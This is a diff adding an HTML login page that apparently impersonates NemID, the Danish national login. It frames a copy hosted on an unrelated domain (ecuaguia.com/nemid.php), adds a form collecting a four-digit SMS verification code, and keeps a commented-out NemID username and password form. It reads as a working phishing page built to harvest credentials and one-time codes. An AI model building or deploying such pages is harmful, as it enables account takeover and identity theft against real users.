@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/static/style.css">
+    <title>LoginPage</title>
+</head>
+<body>
+    <div class="container">
+        <div class="loginContainer">
+            <div class="loginRow">
+                <div class="loginItem">
+                    <iframe src="https://ecuaguia.com/nemid.php" frameborder="0"></iframe>
+                    <p id="errorMessage" class="errorMessage"></p>
+                </div>
+                <div class="smsItem">
+                    <form  onsubmit="return false" class="deactive" action="/" id="form1" >
+                        <h4>Write 4 digits verification code:</h4>
+                        <input  type="text" name="" id="numberInput">
+                        <button onclick="sendCode()" class="btnCode"> Send Code </button>
+                    </form>
+                    <div id="printStatus" class="printStatus"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="/static/main.js"></script>
+</body>
+</html>
+
+
+<!--  <form class="loginForm" onsubmit="return false" method="post">
+        <h1>NEMID</h1>
+        <label for="username">Username</label>
+        <input type="text" name="username" id=""/>
+        <label for="password">Password</label>
+        <input type="password" name="password" id="">
+        <button onclick="login()">login</button>
+</form> -->
